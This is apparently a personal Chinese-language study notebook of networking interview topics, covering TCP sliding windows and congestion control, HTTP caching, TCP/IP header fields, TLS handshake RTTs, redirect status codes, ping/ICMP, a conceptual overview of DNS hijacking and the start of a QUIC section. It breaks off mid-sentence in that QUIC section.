*   **#4 (Not Sent and Not Allowed)**: 这部分是未来的数据，必须等待窗口“滑动”后才能发送。

**发送窗口的大小 = #2 + #3**

---

### 3. 窗口是如何“滑动”的？

“滑动”是这个机制的动态体现。窗口的“滑动”完全依赖于**接收方的确认 (ACK)**。

**流程如下**：

1.  **发送数据**：发送方将窗口内（#3区域）的数据一个个地发送出去。每发送一个，就将其状态从 #3 变为 #2。

2.  **接收确认**：当接收方 B 成功接收数据后，会回复一个 `ACK` 报文。这个 `ACK` 报文非常关键，它包含了：
    *   **确认号 (Acknowledgment Number)**: 告诉发送方：“**这个序号之前的所有数据我都已经正确收到了**，请你下一次从这个序号开始发送。” 这是**累积确认**机制。

3.  **窗口滑动**：当发送方 A 收到这个 `ACK` 后，它就知道哪些数据（#2区域）已经被对方成功接收。于是，它就可以将窗口的**左边界**向右移动，越过这些已被确认的数据。窗口整体向右移动，看起来就像在数据流上“滑动”一样。

4.  **发送新数据**：窗口向右滑动后，#4 区域的一部分数据就会被纳入新的窗口内，变为 #3 区域，从而可以被发送。

**这个过程周而复始，实现了数据的连续发送和确认。**

---

### 4. 一个具体的例子

假设：
*   发送方要发送 3000 字节的数据，序号从 1 开始。
*   窗口大小为 1000 字节。

1.  **初始状态**：发送窗口覆盖了 字节。发送方可以立即发送这 1000 字节的数据，而无需等待。

2.  **发送**：发送方将 1-1000 字节全部发送出去。此时，窗口内所有数据都处于“已发送但未确认”状态。

3.  **部分确认**：假设接收方收到了 1-500 字节，于是它回复一个 **`ACK = 501`**（表示 501 之前的所有数据都收到了）。

4.  **滑动**：发送方收到 `ACK = 501` 后，它就知道 1-500 字节已经安全送达。于是，它将窗口的左边界移动到 501。
    *   **新窗口**: (左边界移动，右边界也相应移动，总大小不变)
    
5.  **发送新数据**：现在，发送方可以继续发送新的 1001-1500 字节的数据了。

---

### 5. 滑动窗口与流量控制 (Flow Control)

上面我们假设窗口大小是固定的，但实际上，**窗口的大小是由接收方决定的**。

*   接收方有一个接收缓冲区，用于存放收到的数据。
*   在每次发送 `ACK` 确认时，接收方都会在 TCP 头部中的“**窗口大小 (Window Size)**”字段，告诉发送方：“我现在的缓冲区还剩下多少空间（例如 `rwnd = 5000` 字节），你接下来最多只能发这么多数据给我。”
*   发送方收到后，会动态调整自己发送窗口的大小，使其不超过接收方通告的 `rwnd` 值。

**这就是流量控制**：通过接收方动态地通告其处理能力，来控制发送方的发送速率，从而确保接收方的缓冲区不会被“撑爆”。如果接收方很忙，缓冲区满了，它就可以通告一个大小为 0 的窗口，让发送方暂停发送。

### 总结

*   **滑动窗口**是一种允许发送方连续发送多个数据包而无需等待每个包都被确认的机制，极大地**提高了吞吐量**。
*   窗口的“滑动”是靠接收方的**累积确认 (ACK)** 来驱动的。
*   窗口的“大小”是由接收方在其 `ACK` 报文中**动态通告**的，这实现了**流量控制**，确保了通信的可靠性。

* **TCP 的流量控制** 是通过 **滑动窗口机制** 来实现的，接收方通过 TCP 头部的 **窗口大小字段**告知发送方自己剩余的缓冲空间，发送方根据这个信息调整发送速率，以避免接收方的缓冲区溢出。

* 发送方的滑动窗口大小等于：已发送未确认+未发送可发送的大小。

* 拥塞控制：拥塞窗口（cwnd）是在发送端定义的，一旦出现丢包，拥塞窗口就会减小，发送端的最大发送范围是拥塞窗口和滑动窗口中较小的一个

### 拥塞控制

* **慢启动（Slow Start）**：
  - 初始 `cwnd` 小，每收到1个 ACK，**cwnd 的大小就会加 1，实现 指数增长**，直到达到 慢启动门限（ssthresh）
  
  - 拥塞避免算法：**每当收到一个 ACK 时，cwnd 增加 1/cwnd**，线性增加
  
  - 拥塞发生，启用快速重传，`cwnd = cwnd/2` ，也就是设置为原来的一半; `ssthresh = cwnd`;
  
    



## ***强制缓存和协商缓存

这个问题问得非常好 👍，**强缓存** 和 **协商缓存** 是 **HTTP 缓存机制**的两种主要方式。我们分开讲：

### 📌 1. 强缓存（强制缓存）

- **特点**：直接用本地缓存，不会发请求到服务器。
- **相关字段**：`Expires`、`Cache-Control`

### 工作流程

1. 浏览器请求资源，服务器返回，并在响应头加缓存字段：

   ```yaml
   Cache-Control: max-age=3600
   Expires: Wed, 04 Sep 2024 12:00:00 GMT
   ```

2. 浏览器下次请求时，会先检查缓存：

   - 如果缓存没过期 → **直接用缓存**，状态码 **200 (from disk/memory cache)**。
   - 如果过期了 → 进入 **协商缓存**。

👉 优点：快，不用发请求。
 👉 缺点：过期前内容改了，浏览器也不知道。

------

### 📌 2. 协商缓存（对比缓存）

- **特点**：浏览器会带上缓存标识去问服务器，服务器判断是否能用缓存。
- **相关字段**：`Last-Modified` / `If-Modified-Since`、`ETag` / `If-None-Match`

### 工作流程

1. 首次请求，服务器返回：

   ```yaml
   Last-Modified: Wed, 04 Sep 2024 10:00:00 GMT
   ETag: "abc123"
   ```

   浏览器缓存下来。

2. 下次请求时，浏览器带上条件：

   ```yaml
   If-Modified-Since: Wed, 04 Sep 2024 10:00:00 GMT
   If-None-Match: "abc123"
   ```

3. 服务器判断：

   - 如果资源没改 → 返回 **304 Not Modified**，浏览器用本地缓存。
   - 如果资源改了 → 返回 **200 和新资源**。

👉 优点：资源变化能及时感知。
 👉 缺点：每次都要发请求问服务器，多一次网络往返。

------

### 📌 3. 强缓存 vs 协商缓存 对比

| 特性             | 强缓存                   | 协商缓存                     |
| ---------------- | ------------------------ | ---------------------------- |
| 请求是否到服务器 | ❌ 不会发请求（未过期时） | ✅ 会发请求                   |
| 响应状态码       | 200 (from cache)         | 304 Not Modified             |
| 优点             | 速度最快                 | 能保证数据最新               |
| 缺点             | 有可能拿到过期数据       | 需要和服务器交互，速度慢一些 |

------

### 📌 4. 两者结合

实际中：

- **先查强缓存**（`Cache-Control`、`Expires`）
- 如果没命中或过期，再查 **协商缓存**（`ETag`、`Last-Modified`）

## ***tcp头部有哪些字段

字段详解

#### 1. 源端口 (Source Port) - 16位

*   **作用**: 标识发送方应用程序的端口号。
*   **好比**: 运单上的“发件人地址门牌号”。
*   **例子**: 当你的浏览器访问网页时，操作系统会为浏览器分配一个临时的、通常大于1023的端口号（如 54321），这就是源端口。

#### 2. 目的端口 (Destination Port) - 16位

*   **作用**: 标识接收方应用程序的端口号。
*   **好比**: 运单上的“收件人地址门牌号”。
*   **例子**: 浏览器访问一个 HTTP 网站，目的端口就是 80；访问一个 HTTPS 网站，目的端口就是 443。

#### 3. 序列号 (Sequence Number) - 32位

*   **作用**: 这是TCP可靠性的基石之一。它为发送的每一个字节都编一个号。这个字段的值是当前数据包中**第一个字节的编号**。
*   **好比**: 一本书的“页码”。它告诉接收方，这份数据是书里的第几页，以便接收方能按正确顺序重组。
*   **例子**: 如果一个数据包的序列号是 300，它携带了100字节的数据，那么下一个数据包的序列号就应该是 400。

#### 4. 确认号 (Acknowledgment Number) - 32位

*   **作用**: 这是TCP可靠性的另一个基石。它告诉发送方，我**期望接收的下一个字节的序列号是多少**。这隐含地确认了在此之前的所有字节都已成功接收。
*   **好比**: 你读完书的第399页后，告诉作者：“我已读完399页，请给我第400页。”
*   **注意**: 这个字段只有在下面的 `ACK` 标志位被设置为1时才有效。

#### 7. 标志位 (Flags) - 9位

*   **作用**: 这是一些开关，用来控制TCP连接的状态。
*   **好比**: 运单上的一排复选框，如“加急”、“需要签收”、“易碎品”等。
    *   **NS (Nonce Sum)**: ECN（显式拥塞通知）的扩展，用于防止意外或恶意的拥塞反馈。
    *   **CWR (Congestion Window Reduced)**: 发送方在降低其发送速率后，用此标志通知对方。
    *   **ECE (ECN-Echo)**: 表示收到了一个拥塞信号。
    *   **URG (Urgent)**: 表示“紧急指针”字段有效，有紧急数据需要优先处理（现代应用中很少使用）。
    *   **ACK (Acknowledgment)**: 表示“确认号”字段有效。在连接建立后，几乎所有的数据包都会置1。
    *   **PSH (Push)**: 催促接收方尽快将数据交给应用程序，不要为了提高网络效率而等待填满缓冲区（例如，在SSH这种实时交互应用中）。
    *   **RST (Reset)**: 异常关闭连接。用于响应无效的数据包或重置一个混乱的连接。
    *   **SYN (Synchronize)**: 在建立连接的“三次握手”过程中，第一个数据包会置1，用于同步序列号。
    *   **FIN (Finish)**: 正常关闭连接。表示发送方已经没有数据要发送了。

#### 8. 窗口大小 (Window Size) - 16位

*   **作用**: 用于流量控制。它告诉对方，我本地的接收缓冲区还剩下多大空间，你这次最多可以发这么多数据给我，再多我就处理不过来了。
*   **好比**: 你告诉快递员：“我的储物柜还剩2立方米的空间，你下次送货别超过这个体积。”

#### 9. 校验和 (Checksum) - 16位

*   **作用**: 用于检查数据在传输过程中是否出错。发送方会根据头部和数据内容计算一个值；接收方用同样的方法再算一遍，如果两个值不匹配，说明数据已损坏，这个数据包会被丢弃。
*   **好比**: 运单上的“物品数量和总重量”，收件人可以核对一下，看看中途有没有丢失或损坏。

## tls ssl握手需要几个rtt才能完成这个握手

2个rtt

| **步骤**   | **发送方**                                                   | **接收方** | **消耗 RTT** | **目的**                                                     |
| ---------- | ------------------------------------------------------------ | ---------- | ------------ | ------------------------------------------------------------ |
| **消息 1** | Client Hello                                                 | Server     | 0.5 RTT      | 客户端发送支持的 TLS 版本、密码套件、随机数。                |
| **消息 2** | Server Hello & Certificate & Server Key Exchange & Server Hello Done | Client     | **1 RTT**    | 服务器发送选择的套件、证书、密钥交换信息。                   |
| **消息 3** | Client Key Exchange & Change Cipher Spec & Finished          | Server     | **2 RTT**    | 客户端发送加密的预主密钥、切换到加密模式、发送 Finished 消息。 |
| **消息 4** | Change Cipher Spec & Finished                                | Client     | 2 RTT        | 服务器确认切换到加密模式、发送 Finished 消息。               |

## 301，302，304状态码什么意思

### 1. `301 Moved Permanently` (永久重定向)

#### 含义
服务器告诉客户端（通常是浏览器），你请求的资源已经**永久性地**移动到了一个新的URL地址。响应头中会包含一个新的`Location`字段，指明资源的新位置。

#### 关键特性
*   **永久性**: 这是最重要的特征。它告诉浏览器和搜索引擎：“旧地址已经作废，请用新地址替换它。”
*   **浏览器行为**: 浏览器在收到301后，不仅会立即跳转到新的`Location`地址，而且通常会**缓存**这个重定向。下次你再访问旧地址时，浏览器可能不会再向服务器发请求，而是直接从缓存中读取新地址并跳转，以提高效率。

#### 常见使用场景
1.  **网站更换域名**: 从 `my-old-site.com` 迁移到 `my-new-site.com`。
2.  **HTTP迁移到HTTPS**: 这是最常见的场景，将所有`http://`的请求永久重定向到`https://`。
3.  **URL结构调整**: 将动态、不友好的URL（如`site.com/products.php?id=123`）改为静态、语义化的URL（如`site.com/products/cool-widget`）。

---

### 2. `302 Found` (临时重定向)

#### 含义
服务器告诉客户端，你请求的资源**暂时**可以在另一个URL找到。客户端应该对**本次请求**使用这个新地址，但**未来的请求仍应继续使用原始地址**。

#### 关键特性
*   **临时性**: 这是与301的根本区别。它表示这种跳转只是暂时的，原始URL依然是有效的。
*   **浏览器行为**: 浏览器会跳转到`Location`指定的新地址，但**不会**像301那样永久缓存这个重定向。下次访问原始URL时，浏览器会再次向服务器发起请求。
*   **SEO影响**: 搜索引擎会认为这是一个临时跳转。它**不会**将旧URL的权重转移到新URL，并且会**继续抓取和索引原始的旧URL**。如果你错误地将永久迁移的页面使用了302，将会对网站的SEO造成严重伤害。

#### 常见使用场景
1.  **网站维护**: 临时将所有流量引导到一个“网站正在维护中”的页面。
2.  **A/B测试**: 临时将一部分用户重定向到一个新版本的页面，以测试效果。
3.  **基于地理位置或设备的重定向**: 根据用户IP将其导向特定国家/地区的版本（如`site.com` -> `site.com/us/`），或者根据设备类型导向移动版/桌面版网站。
4.  **未登录用户跳转**: 用户访问一个需要登录的页面时，临时将其重定向到登录页，登录成功后再跳回原来的页面。

---

### 3. `304 Not Modified` (未修改)

#### 含义
这是一种特殊的、与缓存相关的响应。它告诉客户端，自上次请求以来，你请求的资源**没有任何变化**。因此，客户端可以直接使用其本地缓存的版本，无需服务器再次传输。

#### 关键特性
*   **节省带宽**: 这是304的核心价值。服务器返回的**响应体是空的**，只有一个响应头。客户端无需重新下载整个文件（如CSS、JS、图片），从而极大地提升了加载速度，减少了服务器和客户端的带宽消耗

## 网络包通过路由器 怎么判断是不是局域网的ip呢

### 关键角色：IP地址与子网掩码

每个连接到网络的设备，包括路由器本身，都拥有一个IP地址和相应的子网掩码。

*   **IP地址**：是设备在网络中的唯一标识。
*   **子网掩码**：用于指明一个IP地址的哪一部分是“网络地址”，哪一部分是“主机地址”。网络地址标识了设备所在的特定网络，而主机地址则标识了该网络内的具体设备。

### 判断流程

1.  **提取目标IP地址**：路由器首先会检查接收到的数据包的包头信息，从中提取出目标设备的IP地址。

2.  **“与”运算确定网络地址**：路由器的关键操作是进行逻辑“与”（AND）运算。
    *   它将数据包的目标IP地址与路由器自身配置的子网掩码进行“与”运算，得出一个网络地址。
    *   同时，它也将自己LAN口的IP地址与同一个子网掩码进行“与”运算，得出自己所在局域网的网络地址。

3.  **比较网络地址**：最后，路由器会比较这两个运算结果。
    *   **结果相同**：如果两个网络地址完全一致，路由器就断定目标设备位于同一个局域网内。此时，它会查询ARP缓存（或发送ARP请求）以获取目标IP地址对应的MAC地址（物理地址），然后将数据包直接从相应的局域网端口发送给目标设备。
    *   **结果不同**：如果两个网络地址不匹配，则说明目标设备不在本地网络中。路由器会认为这是一个需要发往外部网络的数据包。它会查找自己的路由表，根据路由规则将数据包转发到下一个“跃点”，通常是互联网服务提供商（ISP）的路由器，也就是所谓的“默认网关”。

**举例说明：**

假设您的家用路由器设置如下：
*   **路由器LAN口IP地址**：192.168.1.1
*   **子网掩码**：255.255.255.0

现在，路由器收到了一个目标IP地址为 **192.168.1.100** 的数据包。

1.  路由器将目标IP `192.168.1.100` 与子网掩码 `255.255.255.0` 进行“与”运算，得到网络地址 `192.168.1.0`。
2.  路由器将自身IP `192.168.1.1` 与子网掩码 `255.255.255.0` 进行“与”运算，也得到网络地址 `192.168.1.0`。
3.  由于两个结果相同，路由器确认目标设备在局域网内，并将数据包发送至IP地址为192.168.1.100的设备。

如果目标IP地址是 **8.8.8.8**（谷歌的DNS服务器地址），路由器进行同样的运算后会发现其网络地址与本地网络地址不同，因此会将该数据包转发至默认网关。

## MTU 与 MSS 的区别

- **MTU**：链路层能承载的最大 IP 包大小。
- **MSS（Maximum Segment Size）**：TCP 层在一个报文段中能放的最大数据量。

关系是：

MSS=MTU−IP头大小−TCP头大小  ，MSS = MTU - IP头大小 - TCP头大小MSS=MTU−IP头大小−TCP头大小

以太网常见情况：

MSS=1500−20−20=1460 字节MSS = 1500 - 20 - 20 = 1460 \ \text{字节}MSS=1500−20−20=1460 字节

## ipv4和ipv6有什么区别

位数不同，ipv4是32个bit，ipv6是128个bit

## https加密的内容有哪些

除了域名全部加密，包括你的url。

## post比get更安全吗

不完全是，因为如果是http的话，那中间人想拿到信息是很容易的，放在请求头也没什么用

如果是https的话，因为全部加密，所以也无所谓。

唯一的区别就是浏览器缓存会记录访问的url

## ip协议的作用

### 1. 寻址（Addressing）

寻址是 IP 协议最基本的功能。它为连接到互联网的每一台设备都分配一个唯一的 **IP 地址**。

- **唯一标识：** IP 地址就像我们现实生活中的家庭地址一样，确保每一个数据包都有一个明确的来源地和目的地。无论是你的电脑、手机、还是网站服务器，都必须有一个 IP 地址才能在网络中通信。
- **分层地址：** IP 地址分为网络 ID 和主机 ID。这使得网络可以被划分成更小的子网，方便管理，也让路由变得更高效。路由器只需要根据数据包的目标网络 ID 来进行转发，而不需要关心具体的主机。

### 2. 路由（Routing）

路由是 IP 协议的核心功能，它决定了数据包在网络中如何从起点到达终点。

- **路径选择：** IP 协议不保证数据包会沿着最短的路径传输，它只负责将数据包从一个网络节点（比如路由器）转发到下一个，直到它到达最终目的地。这个过程就像是邮政系统，每到一个分拣中心（路由器），工作人员都会根据信封上的地址决定下一步该寄往哪里。
- **无连接性：** IP 协议是**无连接的**（Connectionless）。这意味着每一个数据包都是独立发送的，它们可能通过不同的路径到达目的地。IP 协议不关心数据包的顺序或完整性，也不保证送达。这些任务由传输层（如 TCP）负责。
- **数据包封装：** IP 协议将来自上层（如 TCP 或 UDP）的数据封装成一个个独立的 **IP 数据包**。每个数据包都带有源 IP 地址和目标 IP 地址等信息，这些信息是路由决策的依据。

## 微信语音通话，有一端网络不好时，是怎么确定哪一端的

当你和朋友使用微信进行语音通话时，如果有一方网络不好，导致声音卡顿、延迟或失真，微信是如何判断出是哪一端出了问题的呢？这主要依赖于实时通信协议中的几个关键技术指标。

### 1. 数据包的传输质量指标

微信的语音通话使用的是 UDP（用户数据报协议）而不是 TCP，因为 UDP 延迟低，更适合实时性要求高的语音传输。但 UDP 不保证数据包的送达和顺序。为了弥补这个不足，微信会在应用层监控以下几个重要的指标：

- **丢包率（Packet Loss）：** 这是最直接的指标。发送端每秒发送固定数量的语音数据包。如果接收端收到的数据包数量远小于发送端发送的数量，就说明在传输过程中发生了严重的丢包。丢包是导致声音卡顿和断续的主要原因。
- **网络抖动（Jitter）：** 抖动指的是数据包到达时间间隔的变化。即使所有数据包都到达了，如果它们的到达时间很不规律（忽快忽慢），也会导致接收端无法稳定地播放声音，产生卡顿。
- **往返时延（Round-Trip Time, RTT）：** 这指的是一个数据包从发送端发出，到接收端收到，再到接收端发送确认，最后发送端收到确认的总时间。如果 RTT 很高，就意味着通话有明显的延迟，双方对话会感觉像是在“接力”。

### 2. 双向数据流的监控

微信的语音通话是**双向**的。它会同时监控**从你到朋友**，以及**从朋友到你**这两个方向的数据流。

- **发送端：** 你的手机会持续向微信服务器发送关于你本地网络状态的报告，比如你发送数据包的速率。
- **接收端：** 你的手机也会持续接收来自你朋友的数据包，并向服务器报告接收到的数据包的质量，比如丢包率和抖动。

服务器会收集你和朋友双方的这些数据，然后进行比对。

### 3. 如何判断是哪一端的问题？

服务器会综合分析两组数据来做出判断：

- **情况一：你朋友的声音卡顿、失真。**
  - 服务器会发现，**从你朋友到你**的数据流质量很差：丢包率高、抖动大、或者延迟高。
  - 同时，服务器会发现，**从你到你朋友**的数据流质量是正常的。
  - 通过对比，服务器就能确定问题出在**你朋友的网络到你**的这条链路上，更准确地说，大概率是你朋友的**上行网络**（上传）或他**到服务器**之间的网络出现了问题。
- **情况二：你自己的声音卡顿、失真（对方听到的）。**
  - 服务器会发现，**从你到你朋友**的数据流质量很差：丢包率高、抖动大。
  - 同时，**从你朋友到你**的数据流质量是正常的。
  - 服务器会判断问题出在**你的上行网络**。

通过这种双向的、实时的、基于数据包质量指标的监控和分析，微信的服务器能够快速、准确地判断出是哪一方的网络状况不佳，并可以在应用界面上给出相应的提示，比如“对方网络不稳定”。这整个过程是全自动的，并且是毫秒级的。

## dns劫持

#### 1. 本地劫持

*   **恶意软件/病毒**: 电脑中毒后，恶意软件可以直接修改你电脑的 `hosts` 文件。这个文件的优先级高于 DNS 查询，可以强制将某个域名指向一个恶意 IP。
*   **修改 DNS 设置**: 恶意软件也可以直接修改你操作系统的网络设置，将你的首选 DNS 服务器地址改成一个由黑客控制的恶意 DNS 服务器地址。

#### 2. 路由器劫持

*   这是非常常见的一种家庭网络攻击。黑客通过破解你家用路由器的管理密码，登录到路由器后台。
*   然后，他修改路由器 DHCP 服务配置中的 DNS 服务器地址。
*   这样一来，所有连接到这个路由器的设备（你的手机、电脑、iPad），在自动获取网络配置时，都会被**强制分配一个恶意的 DNS 服务器**。你访问任何网站，都会先去问这个恶意服务器，导致大范围的劫持。

---

### 三、DNS 劫持的危害

1.  **网页钓鱼 (Phishing)**:
    *   将你访问的银行、电商网站（如 `www.icbc.com.cn`）劫持到一个**一模一样的假网站**上。
    *   你在这个假网站上输入的用户名、密码、银行卡号等敏感信息，会全部被黑客窃取。

2.  **弹窗广告 / 流量劫持**:
    *   把你访问的任何网页都劫持到一个中间服务器上。
    *   这个服务器在返回给你正常的网页内容之前，会**强行插入一段广告代码**，导致你的浏览器右下角疯狂弹窗。或者将网页上的正常链接替换成他们自己的推广链接，赚取佣金。

3.  **无法访问特定网站**:
    *   攻击者可以将一个域名（比如 `www.google.com`）直接解析到一个无效的、无法访问的 IP 地址上，导致你无法打开这个网站。

4.  **中间人攻击 (Man-in-the-Middle)**:
    *   这是最危险的情况。流量被导向一个黑客控制的代理服务器。这个服务器可以解密你的非 HTTPS 流量，或者像我们之前讨论的那样，通过伪造证书来尝试解密 HTTPS 流量，窃取所有通信内容。

## 子网掩码的作用

## 当客户端宕机了，服务端如何判断是否要断开这个连接

1. **首先，也是最常用的，是应用层超时。** 服务器程序会自己维护一个计时器，比如设置一个60秒的空闲超时。如果在60秒内没有收到客户端的任何数据，就主动调用close()来关闭连接，回收资源。这种方式非常灵活和及时。
2. **其次，还可以依赖TCP协议本身的Keep-Alive机制。** 我们可以开启这个选项，当连接长时间（默认2小时）没有数据时，TCP层会自动发送探测包。如果多次探测都失败，内核就会自动判定连接失效并关闭它。但因为默认时间太长，它通常只作为一种兜底的保险措施。”

## 内存对齐解释下

## get和post区别

| 特性           | **GET 方法**                                                 | **POST 方法**                                                |
| -------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **用途**       | **获取/查询资源**                                            | **传输/修改资源**                                            |
| **数据位置**   | **URL 的查询参数中**（在 `?` 后面）                          | **请求体 (Request Body) 中**                                 |
| **数据可见性** | **可见。** 显示在浏览器地址栏和历史记录中。                  | **不可见。** 不会显示在地址栏。                              |
| **数据大小**   | **有限制。** 受到浏览器和服务器对 URL 长度的限制（通常几 KB）。 | **无理论限制。** 实际限制取决于服务器配置。                  |
| **安全性**     | **较差。** 不能用于传输敏感数据（如密码）。                  | **较高。** 数据不在 URL 中暴露，适合传输敏感数据。           |
| **幂等性**     | **幂等 (Idempotent)。** 重复发送多次请求，对服务器资源状态的影响是相同的（获取数据）。 | **非幂等 (Non-Idempotent)。** 重复发送多次请求，可能导致重复创建资源（如重复提交订单）。 |
| **缓存**       | **可缓存。** 浏览器和代理服务器可以缓存 GET 请求的响应。     | **不可缓存。** 每次请求都需要发送到服务器。                  |

## HTTP的长连接是什么？

建立一个tcp连接 可以收发多个http请求 

如果是短连接 就是发一个http 就得建立一次 开销大

## IP报文的头部有哪些

### **IPv4 头部结构 (The Classic)**

IPv4的头部是一个**20到60字节**的变长结构。可以把它想象成快递包裹上的“面单”，上面写满了包裹的路由信息。这个面单分为**固定部分（20字节）**和**可选部分（最多40字节）**。固定部分 (前20字节，必须存在)**

1.  **版本 (Version, 4位)**:
    *   **作用**: 指明IP协议的版本。对于IPv4，这个值永远是**4** (二进制`0100`)。
    *   **意义**: 让路由器知道该如何解析这个报文的其余部分。
2.  **首部长度 (IHL - Internet Header Length, 4位)**:
    *   **作用**: 表示整个IP头部的长度。
    *   **单位**: 4字节。它的值乘以4，就是头部真正的字节数。
    *   **范围**: 最小值为**5** (二进制`0101`)，代表 `5 * 4 = 20` 字节（即没有可选部分）。最大值为**15** (二进制`1111`)，代表 `15 * 4 = 60` 字节。
4.  **总长度 (Total Length, 16位)**:
    *   **作用**: 表示整个IP数据包的**总长度**，包括头部和数据部分。
    *   **单位**: 字节。最大长度为 2^16 - 1 = 65535字节。
5.  **标识 (Identification, 16位)**:
    *   **作用**: 用于**分片与重组**。当一个IP包因为太大而需要被分割成多个小片段（分片）时，所有这些小片段都拥有**相同**的标识号。
    *   **意义**: 帮助目标主机识别哪些小片段属于同一个原始数据包，以便将它们重新组合起来。
8.  **生存时间 (Time to Live - TTL, 8位)**:
    *   **作用**: 防止数据包在网络中**无限循环**。
    *   **工作方式**: 数据包每经过一个路由器，该路由器就会将TTL的值**减1**。当TTL变为**0**时，路由器会丢弃这个包。
    *   **意义**: 这是网络诊断工具 `traceroute` 的工作原理基础。
10. **首部校验和 (Header Checksum, 16位)**:
    *   **作用**: 用于检验IP**头部**在传输过程中是否发生了损坏。
    *   **工作方式**: 发送方计算头部校验和并填充，路由器每修改TTL后都需要**重新计算**并填充，接收方再次校验。如果不匹配，则丢弃该包。**注意：它只校验头部，不校验数据部分。**
11. **源IP地址 (Source Address, 32位)**:
    *   **作用**: 发送方的IP地址，比如 `192.168.1.100`。
12. **目的IP地址 (Destination Address, 32位)**:
    *   **作用**: 接收方的IP地址，比如 `8.8.8.8`。

## ping 的工作原理

好的，`ping` 是网络诊断中最基础、最常用的工具之一。它的工作原理非常简单、直接，但背后却完美地展示了网络分层模型的协作。

我将用一个非常生动的比喻，然后深入技术细节来为你彻底解释 `ping` 的工作原理。

### 一、核心思想的比喻：声纳探测

你可以把 `ping` 命令想象成潜水艇的**声纳探测**。

1.  **发出脉冲**: 你的电脑（潜水艇）向一个目标（比如另一艘潜艇 `google.com`）发出一个特定频率的声纳脉冲，并同时看一眼手表，记下当前时间。这个脉冲上写着：“喂，听得到吗？我是A，这是我的第1号脉冲。”
2.  **等待回声**: 你安静地等待。
3.  **收到回声**: 目标潜艇听到了你的脉冲，它并不会做什么复杂的分析，只是立刻、原封不动地产生一个“回声”，发回给你。这个回声上同样写着：“听到了，我是B，这是对你第1号脉冲的回应。”
4.  **计算结果**: 当你收到这个回声时，你再看一眼手表，用当前时间减去你发出脉冲的时间，就得到了**往返时间（Round-Trip Time, RTT）**。你就知道了：
    *   **目标是存在的**: 既然有回声，说明对方确实在那里。
    *   **距离有多远**: 往返时间越长，说明“距离”越远（网络延迟越高）。
    *   **信号是否丢失**: 如果你发出了10个脉冲，只收到了8个回声，你就知道了有20%的丢包率。

`ping` 的工作原理，就是这个过程的计算机网络版本。

---

### 二、技术核心：ICMP 协议

`ping` 的实现，完全依赖于一个叫做 **ICMP (Internet Control Message Protocol，互联网控制报文协议)** 的协议。

*   **ICMP 的角色**: ICMP 并不是用来传输用户数据的（不像 TCP 或 UDP），它是在 IP 网络中用于发送**控制消息**和**错误报告**的“信使”。它就像是网络的“勤务兵”或“诊断医生”。
*   **工作在哪一层**: ICMP 属于**网络层**协议，和 IP 协议是平级的“兄弟”关系。ICMP 报文是直接封装在 IP 数据包中进行传输的。

---

### 三、`ping` 的详细工作步骤

当你在命令行输入 `ping google.com` 时，背后会发生以下一系列精确的步骤：

#### **第1步：构造 ICMP 回显请求 (Echo Request)**

1.  `ping` 程序首先会通过 DNS 查询，将 `google.com` 这个域名解析成一个 IP 地址（比如 `172.217.160.78`）。
2.  然后，`ping` 程序会创建一个 **ICMP 回显请求（Echo Request）** 报文。这是一个非常简单的数据包，主要包含：
    *   **类型 (Type)**: 值为 **8**，代表这是一个 Echo Request。
    *   **代码 (Code)**: 值为 **0**。
    *   **校验和 (Checksum)**: 用于检查报文在传输中是否出错。
    *   **标识符 (Identifier)**: 用于区分同一台机器上可能同时进行的多个 `ping` 任务。
    *   **序列号 (Sequence Number)**: 从 0 或 1 开始，每发一个包就加 1。这就像声纳脉冲的编号，用于将请求和响应一一对应。
    *   **数据 (Data)**: 一段可选的、可以填充任意内容的数据，用于计算往返时间。

#### **第2步：封装成 IP 数据包**

这个构造好的 ICMP 报文，会被交给网络层的 IP 协议，像装进一个信封一样，被封装成一个 **IP 数据包**。
*   **IP 头部信息**:
    *   **源 IP 地址**: 你的电脑的 IP 地址。
    *   **目的 IP 地址**: `172.217.160.78` (google.com)。
    *   **协议号**: 值为 **1**，表示 IP 包里装的是 ICMP 报文。
    *   **TTL (Time To Live)**: 生存时间。一个整数，比如 64 或 128。每经过一个路由器，这个值就会减 1。

#### **第3步：发送与路由**

你的电脑将这个 IP 数据包发送出去。它会经过你家里的路由器、运营商的交换机、以及互联网上的多个路由器，一步步地向目标 IP 地址前进。每经过一个路由器，IP 包头里的 TTL 值都会被减 1。

#### **第4步：目标主机接收与处理**

1.  当 `google.com` 的服务器收到这个 IP 数据包后，它的网络协议栈会打开这个“信封”。
2.  它看到 IP 头里的协议号是 1，就知道里面装的是 ICMP 报文。
3.  它解析 ICMP 报文，发现类型是 8（Echo Request）。
4.  服务器的内核（操作系统）理解了这个请求的含义：“哦，有人在 ping 我，我需要回复一个回声。”

#### **第5步：构造 ICMP 回显应答 (Echo Reply) 并发回**

服务器会立刻构造一个 **ICMP 回显应答（Echo Reply）** 报文。
*   **类型 (Type)**: 值为 **0**，代表这是一个 Echo Reply。
*   **代码 (Code)**: 值为 **0**。
*   **标识符和序列号**: **完全复制**自收到的 Echo Request 报文。这是确保应答能与请求匹配上的关键。
*   **数据**: 也完全复制自收到的请求报文。

这个应答报文同样会被封装在一个新的 IP 包里，只不过这次源 IP 和目的 IP 地址反了过来，然后被发回你的电脑。

#### **第6步：你的电脑接收应答并计算结果**

1.  你的电脑收到这个返回的 IP 数据包。
2.  `ping` 程序解析出里面的 ICMP Echo Reply 报文。
3.  它检查**标识符和序列号**，找到与之匹配的那个发出去的请求。
4.  它用当前时间减去当时发送请求时记录的时间，计算出 **RTT**。
5.  它还会记录下返回的 IP 包头里**剩余的 TTL 值**。
6.  最后，`ping` 程序将这些信息格式化后，打印在你的屏幕上，就是你看到的那一行：
    `Reply from 172.217.160.78: bytes=32 time=15ms TTL=116`

### **为什么 `ping` 不使用 TCP 或 UDP？**

*   **目的不同**: TCP/UDP 用于传输应用程序数据，需要端口号来区分不同的应用。而 `ping` 的目的是**测试网络连通性**，这是一个非常底层的网络诊断功能，与任何具体应用无关。
*   **足够简单**: ICMP 非常轻量级，它不需要像 TCP 那样建立复杂的连接（三次握手），也不需要端口号。它直接利用 IP 协议进行传输，完美地满足了“发一个包，收一个回应”的简单需求。

所以，`ping` 通过使用 ICMP 的 Echo Request/Reply 机制，实现了一个简单、高效、可靠的网络连通性和延迟探测工具。

## quic协议

好的，我们来深入探讨一下 **QUIC (Quick UDP Internet Connections)** 协议。它是互联网通信领域的一项重大革新，也是理解 HTTP/3 的关键。

简单来说，QUIC 是一个全新的、构建在 **UDP** 之上的**加密传输协议**。它被设计用来取代 TCP，旨在解决现代网络应用中的许多

